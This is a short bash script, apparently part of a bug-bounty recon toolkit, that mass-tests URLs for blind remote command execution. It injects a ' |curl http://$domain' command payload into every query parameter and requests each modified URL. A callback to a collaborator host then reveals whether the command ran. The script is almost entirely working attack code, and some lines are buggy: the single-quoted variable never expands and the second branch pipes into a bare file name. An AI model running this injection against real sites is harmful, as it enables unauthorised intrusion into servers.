#RCE-------------------------------------------------------------------------------------





echo	"1. qsreplace_blind-rce (urls.txt parameters_paramspider.txt)   2. qsreplace_blind-rce (.txt)"  

mkdir results/rce	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                echo -n "Enter the collaborator payload (payloads.burpcollaborator.net) : "
				read domain
                                #Exploit  
                                cat urls.txt parameters_paramspider.txt | sort -u | gf rce | grep '=' | qsreplace -a ' |curl http://$domain' | while read url; do rce=$(curl -s $url);echo -e "[RCE-test]$url";done | tee blind_rce.txt
 
                                #move file
                                mv blind_rce.txt results/rce

		;;

	2)
                                echo -n "Enter the file name (*.txt) : "
				read file
                                echo -n "Enter the collaborator payload (payloads.burpcollaborator.net) : "
				read domain
				#Exploit
				cat $file | grep '=' | qsreplace -a ' | |curl http://$domain' | while read url; do rce=$(curl -s $url);echo -e "[RCE-test]$url";done | blind_rce_random-file.txt
 
                                #move file
                                mv blind_rce_random-file.txt results/rce
		;;
          
	
                *)
                        echo "Please give valid choice!!!"
		;;

esac










#RCE-------------------------------------------------------------------------------------
